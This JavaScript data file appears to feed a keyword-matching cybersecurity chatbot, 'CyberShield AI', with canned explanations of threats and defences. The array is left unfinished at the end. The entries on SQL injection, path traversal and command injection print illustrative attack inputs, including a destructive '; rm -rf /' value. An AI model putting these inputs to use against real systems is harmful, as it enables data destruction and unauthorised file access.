// ============================================================
// CyberShield AI — Comprehensive Cybersecurity Dataset v2.0
// 2000+ lines | 120+ topics | Claude-level responses
// ============================================================

export const cybersecurityDataset = [

  // ── GREETINGS & META ────────────────────────────────────────
  {
    keywords: ["hi", "hello", "hey", "greetings", "good morning", "good afternoon", "good evening", "howdy", "sup", "yo"],
    response: "Hey there! I'm CyberShield AI — your expert cybersecurity companion. I can walk you through anything from phishing and ransomware to zero-days, cryptography, penetration testing, cloud security, and beyond. What would you like to explore today?"
  },
  {
    keywords: ["help", "what can you do", "capabilities", "guide", "assist", "topics", "what do you know"],
    response: "I cover the full spectrum of cybersecurity: threat types (malware, ransomware, phishing, DDoS), defensive tech (firewalls, VPNs, MFA, EDR), offensive security (pen testing, red teaming, exploits), cryptography, cloud security, compliance frameworks (GDPR, HIPAA, ISO 27001), career paths, and much more. Just ask anything!"
  },
  {
    keywords: ["who are you", "what are you", "introduce yourself", "your name"],
    response: "I'm CyberShield AI — a cybersecurity-focused assistant trained to explain threats, defenses, concepts, and best practices at any depth level. Whether you're a curious beginner or a seasoned security professional, I'll match your level. Ask away!"
  },
  {
    keywords: ["thank you", "thanks", "appreciate", "cheers", "great answer", "helpful"],
    response: "You're welcome! Staying curious is the best defense. Feel free to ask anything else about cybersecurity — no question is too basic or too advanced."
  },
  {
    keywords: ["bye", "goodbye", "see you", "later", "exit", "quit"],
    response: "Stay safe out there — in the physical world and the digital one! Remember: patch early, use MFA, and trust no one blindly. Come back anytime you have security questions. 👋"
  },

  // ── FOUNDATIONAL CONCEPTS ───────────────────────────────────
  {
    keywords: ["what is cybersecurity", "define cybersecurity", "cybersecurity meaning", "explain cybersecurity"],
    response: "Cybersecurity is the practice of protecting systems, networks, software, and data from digital attacks, unauthorized access, damage, or theft. It spans multiple disciplines: network security, application security, information security, operational security, disaster recovery, and end-user education. The CIA triad — Confidentiality, Integrity, and Availability — forms its foundational model."
  },
  {
    keywords: ["cia triad", "confidentiality integrity availability", "security triad", "cia model"],
    response: "The CIA Triad is the core model of information security:\n• Confidentiality — ensuring only authorized parties can access data (encryption, access controls)\n• Integrity — ensuring data is accurate and unaltered (hashing, checksums, digital signatures)\n• Availability — ensuring systems and data are accessible when needed (redundancy, DDoS protection, backups)\nEvery security control you implement maps back to protecting one or more of these three pillars."
  },
  {
    keywords: ["threat", "vulnerability", "risk", "difference", "asset", "exploit"],
    response: "These four terms form the language of risk:\n• Asset — something of value (data, systems, reputation)\n• Threat — a potential danger (hacker, natural disaster, insider)\n• Vulnerability — a weakness that can be exploited (unpatched software, weak password)\n• Risk — the probability × impact of a threat exploiting a vulnerability\nA threat becomes dangerous only if a matching vulnerability exists. Eliminating vulnerabilities reduces risk even when threats remain."
  },
  {
    keywords: ["attack surface", "attack vector", "reduce surface", "exposure"],
    response: "The attack surface is the total sum of different points (vectors) where an attacker can try to enter or extract data. Attack vectors include network ports, web applications, email, removable media, APIs, and even employees. Reducing your attack surface — by disabling unused services, closing ports, removing unnecessary software — directly reduces your exposure to attacks."
  },
  {
    keywords: ["defense in depth", "layered security", "onion model", "multiple layers"],
    response: "Defense in depth is a security strategy that uses multiple overlapping layers of controls so that if one layer fails, others still provide protection. Think of it like a castle: moat (perimeter firewall) → walls (network segmentation) → guards (IDS/IPS) → locked doors (access control) → safes (encryption). No single point of failure compromises the whole system."
  },
  {
    keywords: ["least privilege", "principle of least privilege", "polp", "minimum access"],
    response: "The Principle of Least Privilege (PoLP) states that every user, process, or system should have only the minimum permissions necessary to perform its function — nothing more. This limits the blast radius of breaches: if an attacker compromises a low-privilege account, they can't immediately access everything. Apply it to users, service accounts, applications, and even database queries."
  },
  {
    keywords: ["zero trust", "never trust always verify", "zero trust architecture", "zta"],
    response: "Zero Trust is a security model built on 'never trust, always verify.' Unlike the old perimeter model that trusted everything inside the network, Zero Trust assumes breach and verifies every request as if it comes from an untrusted network. Key principles: verify identity explicitly, use least privilege access, assume breach, inspect all traffic — even internal. It's essential for modern cloud and remote-work environments."
  },
  {
    keywords: ["security by design", "secure by default", "shift left", "bake in security"],
    response: "Security by Design means building security into systems from the start rather than bolting it on afterward. 'Shift left' in software development means integrating security in the earliest phases (design and coding) rather than discovering vulnerabilities after deployment. Secure by default means software ships with the most secure configuration pre-enabled, requiring users to deliberately relax settings."
  },

  // ── AUTHENTICATION & IDENTITY ────────────────────────────────
  {
    keywords: ["password", "strong password", "secure password", "create password", "password tips"],
    response: "A strong password should be: at least 16 characters long, a random mix of uppercase, lowercase, numbers, and symbols, unique per site (never reused), and never based on personal info (birthdays, names). Best practice: use a password manager (Bitwarden, 1Password, KeePass) to generate and store truly random passwords. You only need to remember one master password."
  },
  {
    keywords: ["password manager", "bitwarden", "1password", "keepass", "lastpass", "store passwords"],
    response: "A password manager generates, stores, and auto-fills strong, unique passwords for every account — secured behind one master password you remember. Top choices: Bitwarden (open-source, free tier), 1Password (excellent UX, team features), KeePass (local, no cloud). They also flag reused or breached passwords. The risk of one weak password reused everywhere far exceeds the risk of a properly secured password manager."
  },
  {
    keywords: ["mfa", "2fa", "two-factor", "multi-factor", "authenticator app", "google authenticator", "authy"],
    response: "Multi-Factor Authentication (MFA) requires two or more verification factors: something you know (password), something you have (authenticator app, hardware key), or something you are (biometrics). Even if your password is stolen, an attacker can't log in without the second factor. TOTP apps (Google Authenticator, Authy, Aegis) are far more secure than SMS-based 2FA, which is vulnerable to SIM swapping. Use hardware keys (YubiKey) for highest security."
  },
  {
    keywords: ["otp scam", "otp fraud", "otp theft", "steal otp", "otp hack", "one time password scam", "fake otp", "otp bypass", "intercept otp", "otp attack"],
    response: "OTP (One-Time Password) scams trick victims into revealing their 2FA codes to attackers in real time. Common methods:\n• Fake bank/service calls — attacker impersonates support and asks you to 'read out the OTP' they just triggered\n• Phishing pages — real-time reverse proxy sites (EvilginX, Modlishka) capture your OTP the moment you enter it and replay it instantly\n• SS7 attacks — exploit telecom network flaws to intercept SMS OTPs\n• Social engineering — urgency tactics ('Your account will be locked!') pressure victims into sharing codes\n\nGolden rule: NO legitimate company, bank, or support agent will EVER ask you to read out an OTP over the phone or chat. OTPs are meant only for you to enter into the official website or app — the moment someone asks you to share it verbally, it's a scam. Switch to hardware security keys (YubiKey) or passkeys — they are phishing-proof and cannot be intercepted this way."
  },
  {
    keywords: ["otp", "one time password", "totp", "time based otp", "how otp works", "otp security"],
    response: "A One-Time Password (OTP) is a temporary code valid for a single login session, typically 30-60 seconds. TOTP (Time-based OTP) is generated by apps like Google Authenticator or Authy using a shared secret + current timestamp (HMAC-SHA1 algorithm). HOTP uses a counter instead of time. OTPs add a strong second factor — even if your password is stolen, an attacker needs the live OTP too. Weakness: OTPs can be phished in real time via proxy attacks or social engineering. Use hardware keys (FIDO2/WebAuthn) for phishing-proof authentication."
  },
  {
    keywords: ["sim swap", "sim swapping", "sim hijacking", "phone number attack"],
    response: "SIM swapping is an attack where a criminal convinces your mobile carrier to transfer your phone number to a SIM card they control. Once they have your number, they can intercept SMS-based 2FA codes, reset account passwords, and take over accounts. Defenses: switch from SMS-based 2FA to authenticator apps or hardware keys, add a carrier PIN/passcode, and use Google Voice as a buffer number."
  },
  {
    keywords: ["biometrics", "fingerprint", "face id", "facial recognition", "iris scan"],
    response: "Biometric authentication uses unique physical traits — fingerprints, facial geometry, iris patterns, voice — for verification. It's highly convenient and resistant to password theft. Limitations: biometrics can't be changed if compromised (unlike passwords), can be spoofed with high-quality fakes (though modern implementations use liveness detection), and raise privacy concerns around data storage. Best used as part of multi-factor authentication, not as the sole factor."
  },
  {
    keywords: ["passkey", "fido2", "webauthn", "passwordless", "hardware key", "yubikey"],
    response: "Passkeys are the next evolution of authentication — they replace passwords entirely using public-key cryptography. When you create a passkey, your device generates a cryptographic key pair: the private key stays on your device, the public key goes to the server. Login requires biometric verification on your device. Passkeys are phishing-proof (they're bound to the exact website), resistant to breaches (servers never store secrets), and already supported by Apple, Google, and Microsoft."
  },
  {
    keywords: ["oauth", "sso", "single sign on", "openid", "saml", "federated identity"],
    response: "Single Sign-On (SSO) lets users authenticate once and access multiple applications. OAuth 2.0 is an authorization framework; OpenID Connect adds authentication on top. SAML is the enterprise XML-based standard. Benefits: fewer passwords, centralized access control, easier offboarding. Risk: SSO provider compromise affects all connected apps — protect it with MFA and monitor login events carefully."
  },
  {
    keywords: ["credential stuffing", "credential", "stuffing", "leaked passwords", "account takeover"],
    response: "Credential stuffing is an automated attack where criminals take username/password pairs leaked from one breach and try them against many other sites, exploiting password reuse. With billions of credentials available on the dark web, the success rate is surprisingly high. Defenses: unique passwords per site (use a manager), MFA everywhere, and rate-limiting/bot detection on login pages. Check if your credentials are exposed at haveibeenpwned.com."
  },
  {
    keywords: ["password spray", "password spraying", "slow brute force", "low and slow"],
    response: "Password spraying is a 'low and slow' attack where an attacker tries a small set of common passwords (like 'Spring2024!') across a large number of accounts, avoiding account lockout thresholds. Unlike traditional brute force, it evades detection by staying under lockout limits. Defenses: block common passwords at account creation, monitor for distributed login failures, enforce MFA."
  },

  // ── PHISHING & SOCIAL ENGINEERING ───────────────────────────
  {
    keywords: ["phishing", "identify phishing", "phishing email", "fake email", "email scam"],
    response: "Phishing emails lure victims into revealing credentials or installing malware. Red flags to spot: sender's actual email address doesn't match the display name, generic greetings ('Dear Customer'), urgency or threats ('Your account will be closed!'), grammar/spelling errors, links that don't match the displayed text (hover to preview), unexpected attachments, requests for sensitive info via email. When in doubt, navigate directly to the website instead of clicking links."
  },
  {
    keywords: ["spear phishing", "targeted phishing", "whaling", "ceo fraud", "business email compromise"],
    response: "Spear phishing is highly targeted — attackers research the victim (LinkedIn, social media, company website) to craft convincing, personalized messages. Whaling targets executives; CEO Fraud / Business Email Compromise (BEC) impersonates executives to trick employees into wire transfers or credential sharing. These attacks bypass technical filters because they're contextually accurate. Defense: verify financial requests via a separate communication channel, train employees, and use DMARC/DKIM/SPF email authentication."
  },
  {
    keywords: ["smishing", "sms phishing", "text message scam", "fake text"],
    response: "Smishing (SMS phishing) uses text messages to trick victims — fake package delivery notices, bank alerts, prize wins — usually with a malicious link. Smishing is effective because people trust texts more than emails and mobile browsers hide full URLs. Defense: never click links in unexpected texts; go directly to the company's official app or website to verify any alert."
  },
  {
    keywords: ["vishing", "voice phishing", "phone scam", "call center scam", "robocall fraud"],
    response: "Vishing (voice phishing) uses phone calls — often with caller ID spoofing — to impersonate banks, tech support (Microsoft scam), IRS, or government agencies. Attackers create urgency and ask for account numbers, SSNs, or remote access. Defense: hang up and call the organization back using the official number on their website. Legitimate entities never demand immediate payment via gift cards."
  },
  {
    keywords: ["social engineering", "psychological manipulation", "pretexting", "human hacking"],
    response: "Social engineering exploits human psychology rather than technical vulnerabilities. Techniques include:\n• Pretexting — fabricating a scenario to gain trust (posing as IT support)\n• Baiting — leaving infected USB drives in parking lots\n• Quid pro quo — offering something in exchange for information\n• Tailgating — physically following someone into a secure area\n• Authority — impersonating executives or officials\nDefense: security awareness training, verification procedures, and a culture where employees feel safe questioning suspicious requests."
  },
  {
    keywords: ["pretexting", "pretext", "impersonation", "social engineering scenario"],
    response: "Pretexting involves creating a fabricated scenario (pretext) to manipulate someone into divulging information or taking action. Examples: calling an employee pretending to be IT support asking for their password 'to fix an issue,' or posing as a vendor to gain physical access. It's the backbone of most sophisticated social engineering. Defense: verify identities through official channels before complying with any unusual request."
  },
  {
    keywords: ["baiting", "usb drop", "malicious usb", "infected drive"],
    response: "Baiting exploits curiosity — attackers leave malware-loaded USB drives in parking lots, lobbies, or restrooms. An employee plugs it in, and the malware auto-executes. Studies show a significant percentage of found USB drives get plugged in. Defense: strict policies against using unknown storage devices, disable USB AutoRun, and deploy endpoint security that scans removable media."
  },
  {
    keywords: ["tailgating", "piggybacking", "physical security", "door access"],
    response: "Tailgating (or piggybacking) is a physical social engineering tactic where an attacker gains entry to a restricted area by following closely behind an authorized person. It exploits social norms (people hold doors open). Defense: mantraps (double-door airlocks), strict badge-in policies, security guard training, and fostering a culture where employees politely challenge unfamiliar individuals."
  },
  {
    keywords: ["dmarc", "dkim", "spf", "email authentication", "email spoofing prevention"],
    response: "Email authentication protocols prevent spoofing:\n• SPF (Sender Policy Framework) — specifies which mail servers are authorized to send email for your domain\n• DKIM (DomainKeys Identified Mail) — adds a cryptographic signature to outgoing emails for verification\n• DMARC (Domain-based Message Authentication, Reporting & Conformance) — tells receiving servers what to do with emails that fail SPF/DKIM (quarantine or reject) and sends reports back to you\nConfiguring all three dramatically reduces phishing using your domain name."
  },

  // ── MALWARE ─────────────────────────────────────────────────
  {
    keywords: ["malware", "types of malware", "malicious software", "what is malware"],
    response: "Malware (malicious software) is any program designed to harm systems or steal data. Major types:\n• Virus — attaches to files, spreads when files are shared\n• Worm — self-replicates across networks without user action\n• Trojan — disguises itself as legitimate software\n• Ransomware — encrypts files and demands payment\n• Spyware — secretly monitors and exfiltrates data\n• Adware — displays unwanted ads, often bundled with free software\n• Rootkit — hides deep in the OS with elevated privileges\n• Keylogger — records keystrokes\n• Fileless malware — lives in memory, leaves no file on disk"
  },
  {
    keywords: ["virus", "computer virus", "file infector", "self replicating"],
    response: "A computer virus attaches its malicious code to legitimate files (executables, documents with macros). When an infected file is opened or executed, the virus activates and can spread to other files on the system or shared drives. Unlike worms, viruses require human action to spread. Modern viruses often include polymorphic capabilities — mutating their code to evade signature-based antivirus detection."
  },
  {
    keywords: ["worm", "network worm", "self propagating", "ms17-010", "wannacry spread"],
    response: "A worm is self-propagating malware that spreads across networks without any user interaction by exploiting vulnerabilities in network services. The infamous WannaCry ransomware used the EternalBlue exploit (targeting MS17-010 vulnerability in Windows SMB) to spread like wildfire, infecting 200,000+ systems in 150 countries in 2017. Defense: patch management and network segmentation to limit lateral movement."
  },
  {
    keywords: ["trojan", "trojan horse", "rat", "remote access trojan", "backdoor trojan"],
    response: "A Trojan disguises itself as legitimate, desirable software — a game, utility, or cracked application — to trick users into installing it. Once inside, it executes its malicious payload: creating backdoors, downloading additional malware, or establishing a Remote Access Trojan (RAT) that gives attackers full remote control of the machine. Unlike viruses and worms, Trojans don't self-replicate — they rely on user deception."
  },
  {
    keywords: ["ransomware", "ransom", "encrypted files", "decrypt", "bitcoin ransom", "lockbit", "conti"],
    response: "Ransomware encrypts the victim's files or locks their system, then demands payment (typically cryptocurrency) for the decryption key. Modern ransomware groups (LockBit, Conti, ALPHV/BlackCat) use double extortion — encrypt AND threaten to publish stolen data. Recovery path: isolated backups are the most reliable. Paying ransom is discouraged (no guarantee of key, funds criminal operations). Prevention: patching, email filtering, endpoint protection, and immutable backups."
  },
  {
    keywords: ["spyware", "stalkerware", "monitoring software", "track activity"],
    response: "Spyware secretly observes user activity and transmits data — browsing history, keystrokes, screenshots, webcam/microphone access — to a remote party. Stalkerware is spyware specifically used by abusive partners to monitor victims without consent. Indicators of infection: sluggish performance, unexpected data usage, battery drain. Remove with reputable anti-malware tools. On mobile, check for unfamiliar apps with excessive permissions."
  },
  {
    keywords: ["adware", "unwanted ads", "browser hijacker", "pop ups", "redirect"],
    response: "Adware displays unwanted advertisements, often bundled with free software (PUPs — Potentially Unwanted Programs). Browser hijackers are a form of adware that modify browser settings (homepage, search engine) and redirect searches to ad-heavy sites. While typically less dangerous than other malware, they degrade performance and some secretly track user behavior. Remove using dedicated adware scanners like Malwarebytes."
  },
  {
    keywords: ["rootkit", "kernel rootkit", "stealth malware", "hide processes", "bootkits"],
    response: "A rootkit is advanced malware designed to gain administrative (root) control while hiding its own existence from detection. Types: user-mode rootkits (modify OS APIs), kernel rootkits (modify the OS kernel itself — hardest to detect), bootkits (infect the MBR/bootloader, activating before the OS loads). Detection requires specialized tools that scan outside the running OS (bootable rescue disks, integrity checkers). Removal often necessitates a clean OS reinstall."
  },
  {
    keywords: ["keylogger", "keystroke logger", "keyboard spy", "capture keystrokes"],
    response: "A keylogger captures every keystroke — passwords, messages, credit card numbers, search queries — and sends them to the attacker. Hardware keyloggers are physical devices inserted between keyboard and computer; software keyloggers are programs running in the background. Defense: use a password manager (auto-fill bypasses keyloggers), enable MFA (stolen passwords alone aren't enough), keep antivirus updated, and use virtual keyboards for sensitive inputs on untrusted machines."
  },
  {
    keywords: ["fileless malware", "memory based malware", "living off the land", "powershell malware", "lolbas"],
    response: "Fileless malware operates entirely in memory (RAM) without dropping files to disk, making it nearly invisible to traditional antivirus that scans files. It leverages legitimate system tools — PowerShell, WMI, Regsvr32 — to execute malicious code (called 'Living off the Land' or LotL attacks). Detection requires behavioral monitoring, memory scanning, and EDR solutions that track process behavior rather than file signatures."
  },
  {
    keywords: ["botnet", "zombie", "bot", "command and control", "c2", "c&c"],
    response: "A botnet is a network of compromised devices ('bots' or 'zombies') controlled by an attacker through a Command & Control (C2) server. Botnets are used for: DDoS attacks, spam campaigns, credential stuffing, cryptocurrency mining, and spreading malware. Modern botnets use peer-to-peer C2 structures (no central server to take down). Defense: keep devices patched and use network monitoring to detect unusual outbound traffic patterns."
  },
  {
    keywords: ["cryptojacking", "cryptominer", "mining malware", "cpu miner", "monero mining"],
    response: "Cryptojacking secretly uses a victim's computing resources to mine cryptocurrency for the attacker — typically Monero (privacy-focused, CPU-minable). Signs: sluggish system, high CPU usage, overheating, increased electricity bills. It can occur via malware installed on devices or through malicious scripts in browsers (browser-based cryptomining). Defense: keep systems patched, use browser extensions that block mining scripts (uBlock Origin), and monitor CPU usage."
  },
  {
    keywords: ["wiper malware", "destructive malware", "disk wiper", "notpetya", "shamoon"],
    response: "Wiper malware is designed purely to destroy data — overwriting or corrupting files, MBRs, or entire disks — with no financial motive. Notable examples: NotPetya (2017, disguised as ransomware, caused $10B+ in damage), Shamoon (targeted Saudi Aramco), and Russian wiper campaigns preceding physical military operations in Ukraine. Defense: isolated backups are the critical countermeasure — if the wiper can reach your backups, you have no recovery."
  },

  // ── RANSOMWARE DEEP DIVE ─────────────────────────────────────
  {
    keywords: ["ransomware as a service", "raas", "ransomware affiliate", "ransomware group"],
    response: "Ransomware-as-a-Service (RaaS) is a criminal business model where ransomware developers license their malware to affiliates (who conduct the actual attacks) in exchange for a percentage of ransom payments. Groups like LockBit, ALPHV/BlackCat, and Cl0p operated this way — lowering the technical barrier for attackers while developers focus on improving the malware and negotiation platforms. This industrialization is why ransomware attacks have exploded."
  },
  {
    keywords: ["double extortion", "triple extortion", "data leak", "ransomware publish"],
    response: "Double extortion ransomware attacks both encrypt victim data AND exfiltrate it, threatening to publish it on 'leak sites' if ransom isn't paid — adding pressure beyond just decryption. Triple extortion adds a third pressure: DDoS attacks against the victim or threatening to contact the victim's customers/partners. This evolution means that even organizations with perfect backups still face extortion over data exposure."
  },
  {
    keywords: ["ransomware backup", "backup strategy", "3-2-1 backup", "immutable backup", "offline backup"],
    response: "The 3-2-1 backup rule: 3 copies of data, on 2 different media types, with 1 copy offsite. For ransomware resilience, add immutability — backups that cannot be modified or deleted even by administrators with stolen credentials (WORM storage, air-gapped backups). Test restoration regularly. Modern ransomware actively seeks and deletes shadow copies (VSS) and network-accessible backups, so isolation is critical."
  },
  {
    keywords: ["ransomware negotiation", "pay ransom", "should i pay", "ransom payment"],
    response: "Whether to pay ransom is a complex decision with no universally right answer. Arguments against paying: funds criminal operations, no guarantee of working decryption key, makes you a target for repeat attacks, may violate sanctions laws (paying sanctioned groups is illegal). Arguments for: sometimes the only recovery path when backups are compromised and business survival is at stake. The FBI generally advises against paying but acknowledges it's sometimes unavoidable. Always involve law enforcement and a ransomware incident response specialist."
  },

  // ── NETWORK ATTACKS ─────────────────────────────────────────
  {
    keywords: ["ddos", "denial of service", "dos attack", "traffic flood", "overwhelm server"],
    response: "A DDoS (Distributed Denial-of-Service) attack floods a target — server, network, or service — with massive traffic volumes from thousands of distributed sources (a botnet), exhausting resources and making it unavailable to legitimate users. Types: volumetric (bandwidth exhaustion), protocol (exploiting network protocol weaknesses), and application layer (HTTP flood targeting web apps). Mitigation: CDN providers (Cloudflare, Akamai), rate limiting, anycast diffusion, and specialized DDoS protection services."
  },
  {
    keywords: ["man in the middle", "mitm", "intercept traffic", "arp spoofing", "ssl stripping"],
    response: "A Man-in-the-Middle (MitM) attack secretly intercepts communication between two parties. Common techniques:\n• ARP Spoofing — poisons ARP tables to redirect LAN traffic through the attacker\n• SSL Stripping — downgrades HTTPS to HTTP to intercept encrypted traffic\n• Evil Twin — fake WiFi access point with a legitimate-sounding name\n• BGP Hijacking — reroutes internet traffic at the ISP level\nDefense: always use HTTPS (check for padlock), use VPNs on public WiFi, enable HSTS, and certificate pinning in apps."
  },
  {
    keywords: ["arp spoofing", "arp poisoning", "arp", "mac address", "local network attack"],
    response: "ARP (Address Resolution Protocol) spoofing exploits the stateless nature of ARP — devices accept ARP replies even without sending requests. An attacker sends crafted ARP messages to associate their MAC address with a legitimate IP (like the gateway), causing traffic to flow through them. This enables MitM attacks, session hijacking, or traffic sniffing on local networks. Defense: Dynamic ARP Inspection (DAI) on managed switches, static ARP entries for critical hosts."
  },
  {
    keywords: ["dns spoofing", "dns poisoning", "dns hijacking", "domain name system attack"],
    response: "DNS poisoning injects malicious DNS records into a resolver's cache, causing users to be silently redirected to attacker-controlled servers even when typing correct URLs. DNS hijacking modifies DNS settings (on routers, via malware, or at the registrar level). Defense: DNSSEC (cryptographically signs DNS records), use reputable DNS resolvers (1.1.1.1, 8.8.8.8), and monitor for unauthorized DNS changes."
  },
  {
    keywords: ["port scanning", "nmap", "network scan", "open ports", "reconnaissance"],
    response: "Port scanning discovers which TCP/UDP ports on a target are open, filtered, or closed — mapping available services and potential attack vectors. Nmap is the most widely used tool. Types: SYN scan (stealthy half-open), full connect scan, UDP scan, and OS fingerprinting. Legitimate uses: network administrators auditing their own infrastructure. Unauthorized scanning is illegal. Defense: firewall rules to expose only necessary ports, IDS/IPS to detect scan patterns."
  },
  {
    keywords: ["firewall", "what is firewall", "packet filter", "stateful firewall", "next gen firewall", "ngfw"],
    response: "A firewall inspects and filters network traffic based on rules. Types:\n• Packet filtering — checks source/destination IP and ports (basic)\n• Stateful inspection — tracks connection state, blocks unsolicited packets\n• Application layer (proxy) — inspects actual content of traffic\n• Next-Generation Firewall (NGFW) — adds IPS, application awareness, TLS inspection, and threat intelligence\nNGFWs from Palo Alto, Fortinet, and Check Point are current enterprise standards. Place firewalls at perimeter, between network segments (internal segmentation), and on endpoints."
  },
  {
    keywords: ["ids", "ips", "intrusion detection", "intrusion prevention", "snort", "suricata"],
    response: "IDS (Intrusion Detection System) monitors traffic and alerts on suspicious activity. IPS (Intrusion Prevention System) goes further — it actively blocks detected threats in real time. Methods:\n• Signature-based — matches known attack patterns (fast, misses zero-days)\n• Anomaly-based — detects deviations from normal behavior (catches unknown attacks, higher false positives)\nPopular tools: Snort and Suricata (open-source, network-based). IDS/IPS is typically deployed alongside firewalls for layered defense."
  },
  {
    keywords: ["network segmentation", "vlan", "dmz", "micro segmentation", "isolate network"],
    response: "Network segmentation divides a network into isolated zones, limiting an attacker's ability to move laterally after gaining initial access. Techniques:\n• VLANs — logical network separation at Layer 2\n• DMZ (Demilitarized Zone) — isolated zone for public-facing servers\n• Micro-segmentation — granular, software-defined zones (used in Zero Trust)\nA properly segmented network means that compromising one zone (e.g., guest WiFi) doesn't automatically grant access to internal systems or production databases."
  },
  {
    keywords: ["packet sniffing", "wireshark", "network sniffer", "traffic capture", "promiscuous mode"],
    response: "Packet sniffing captures and analyzes network traffic in transit. Tools like Wireshark display raw packet contents. On unencrypted protocols (HTTP, FTP, Telnet), sniffers capture credentials in plaintext. On a switched network, an attacker needs MitM positioning to sniff others' traffic. Defense: encrypt all traffic (HTTPS, SSH, TLS), avoid legacy unencrypted protocols, and use network monitoring tools to detect promiscuous mode adapters on your network."
  },
  {
    keywords: ["vpn", "virtual private network", "vpn tunnel", "wireguard", "openvpn", "ipsec"],
    response: "A VPN (Virtual Private Network) encrypts your internet traffic and tunnels it through a server, masking your real IP and protecting data from interception. Protocols: WireGuard (modern, fast, strong security), OpenVPN (mature, widely supported), IPsec/IKEv2 (enterprise standard). Corporate VPNs connect remote workers to internal networks. Consumer VPNs add privacy/anonymity. Note: VPNs don't make you anonymous — your VPN provider can see your traffic. For maximum anonymity, use Tor."
  },
  {
    keywords: ["tor", "onion routing", "dark web access", "anonymous browsing", "tor browser"],
    response: "Tor (The Onion Router) routes your traffic through a series of volunteer relays (nodes), encrypting it in layers like an onion — each relay only knows the previous and next hop, not the full path. This provides strong anonymity. The Tor Browser is the standard tool. Limitations: slow speeds, exit node can see unencrypted traffic, and some exit nodes are malicious. Tor is used by journalists, whistleblowers, privacy advocates — and yes, also by criminals on the dark web."
  },

  // ── WEB APPLICATION SECURITY ─────────────────────────────────
  {
    keywords: ["owasp", "top 10", "web vulnerabilities", "owasp top ten"],
    response: "The OWASP Top 10 is the industry-standard list of the most critical web application security risks:\n1. Broken Access Control\n2. Cryptographic Failures\n3. Injection (SQL, NoSQL, LDAP, OS)\n4. Insecure Design\n5. Security Misconfiguration\n6. Vulnerable & Outdated Components\n7. Identification & Authentication Failures\n8. Software & Data Integrity Failures\n9. Security Logging & Monitoring Failures\n10. Server-Side Request Forgery (SSRF)\nEvery web developer and security professional should be familiar with these."
  },
  {
    keywords: ["sql injection", "sqli", "database injection", "union attack", "blind sqli"],
    response: "SQL Injection occurs when user input is unsafely embedded into SQL queries, allowing attackers to manipulate the database. Example: entering `' OR '1'='1` in a login field to bypass authentication. Types: in-band (results returned directly), blind (true/false responses reveal data bit by bit), and time-based (delays indicate true/false conditions). Defense: use parameterized queries/prepared statements (the only reliable fix), input validation, least-privilege database accounts, and WAFs as a secondary layer."
  },
  {
    keywords: ["xss", "cross site scripting", "stored xss", "reflected xss", "dom xss"],
    response: "Cross-Site Scripting (XSS) injects malicious JavaScript into web pages viewed by other users. Types:\n• Stored XSS — script is saved to the database and served to all visitors\n• Reflected XSS — script is embedded in a URL and executed when clicked\n• DOM-based XSS — manipulates the client-side DOM without going to the server\nAttackers use XSS to steal session cookies, capture credentials, redirect users, or deface sites. Defense: Content Security Policy (CSP) headers, output encoding/escaping all user-supplied data, and avoiding innerHTML with untrusted content."
  },
  {
    keywords: ["csrf", "cross site request forgery", "one click attack", "session riding"],
    response: "CSRF (Cross-Site Request Forgery) tricks a logged-in victim's browser into sending an unauthorized request to a web application. Example: a malicious link or image on another site triggers a funds transfer or password change in your banking app while you're logged in. Defense: CSRF tokens (unique, secret, per-session values included in sensitive forms that the server validates), SameSite cookie attribute, and re-authentication for sensitive actions."
  },
  {
    keywords: ["ssrf", "server side request forgery", "internal service", "metadata endpoint"],
    response: "Server-Side Request Forgery (SSRF) tricks the server into making requests to unintended locations — internal services, cloud metadata endpoints (like AWS's 169.254.169.254 which can expose IAM credentials), or other servers. It's weaponized to bypass firewalls and reach internal-only APIs. The 2019 Capital One breach was enabled by SSRF against AWS metadata. Defense: whitelist allowed request destinations, disable unnecessary URL schemes, block access to cloud metadata endpoints from application servers."
  },
  {
    keywords: ["directory traversal", "path traversal", "dot dot slash", "../", "file inclusion"],
    response: "Path traversal (../../../etc/passwd) exploits insufficient input validation to access files outside the intended directory — like reading server configuration files or system files containing password hashes. Local File Inclusion (LFI) includes local files in server responses; Remote File Inclusion (RFI) includes files from external URLs. Defense: validate and sanitize all file path inputs, use chroot jails to confine accessible paths, and whitelist acceptable file extensions."
  },
  {
    keywords: ["broken access control", "idor", "insecure direct object reference", "privilege escalation", "forced browsing"],
    response: "Broken Access Control is the #1 OWASP risk — applications fail to enforce what users are allowed to do. IDOR (Insecure Direct Object Reference) is a common form: changing a URL parameter from /profile?id=123 to /profile?id=124 accesses another user's data. Privilege escalation exploits flaws to gain unauthorized permissions. Defense: server-side authorization checks on every request (never trust client-side controls), deny by default, and log access control failures."
  },
  {
    keywords: ["command injection", "os command injection", "shell injection", "rce remote code execution"],
    response: "Command injection occurs when user input is unsafely passed to system shell commands, allowing attackers to execute arbitrary OS commands. Example: a ping utility that takes user input `; rm -rf /` appended to the command. Remote Code Execution (RCE) is the broader category of executing arbitrary code on a server. Defense: never pass user input directly to shell functions, use parameterized alternatives, and whitelist allowed input patterns."
  },
  {
    keywords: ["xml injection", "xxe", "xml external entity", "entity expansion"],
    response: "XXE (XML External Entity) injection exploits XML parsers that process external entity references, allowing attackers to read local files (/etc/passwd), trigger SSRF, or cause denial of service (Billion Laughs attack — exponential entity expansion). Defense: disable external entity processing in all XML parsers, use less complex formats like JSON where possible, and apply input validation."
  },
  {
    keywords: ["waf", "web application firewall", "cloudflare waf", "modsecurity"],
    response: "A Web Application Firewall (WAF) sits in front of web applications and inspects HTTP/HTTPS traffic for malicious patterns — SQLi, XSS, CSRF, and other OWASP Top 10 attacks. Options: cloud-based (Cloudflare, AWS WAF, Fastly), hardware appliances, or software (ModSecurity, open-source). Important: WAFs are a defense-in-depth layer, not a substitute for secure coding. A determined attacker will try to bypass WAF rules — fix the underlying vulnerability."
  },
  {
    keywords: ["clickjacking", "ui redressing", "iframe overlay", "x-frame-options"],
    response: "Clickjacking embeds a target site in a transparent iframe over a decoy site, tricking users into clicking elements they can't see — enabling unintended likes, shares, purchases, or account changes. Defense: X-Frame-Options HTTP header (DENY or SAMEORIGIN prevents framing), and Content-Security-Policy: frame-ancestors directive (more flexible modern approach)."
  },
  {
    keywords: ["http security headers", "security headers", "hsts", "csp header", "x-content-type"],
    response: "HTTP security headers harden web applications against common attacks:\n• HSTS — forces HTTPS, prevents SSL stripping\n• Content-Security-Policy (CSP) — controls which resources can load, mitigates XSS\n• X-Frame-Options — prevents clickjacking\n• X-Content-Type-Options: nosniff — prevents MIME type sniffing\n• Referrer-Policy — controls referrer information\n• Permissions-Policy — controls browser feature access (camera, microphone)\nCheck your site's headers at securityheaders.com."
  },
  {
